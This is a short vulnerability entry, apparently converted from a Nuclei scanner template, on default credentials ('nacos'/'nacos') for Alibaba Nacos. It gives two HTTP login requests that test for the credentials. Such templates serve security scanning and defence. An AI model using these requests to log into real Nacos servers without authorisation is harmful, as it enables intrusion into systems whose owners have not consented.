# Vulnerability: Alibaba Nacos - Default Login
**Classification:** NACOS
**Source:** Nuclei Template (`nacos-default-login.yaml`)

## Description
The default username and password for Nacos are both nacos.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /v1/auth/users/login  HTTP/1.1
Host: {{Hostname}}
User-Agent: Nacos-Server
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

POST /nacos/v1/auth/users/login  HTTP/1.1
Host: {{Hostname}}
User-Agent: Nacos-Server
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}
```

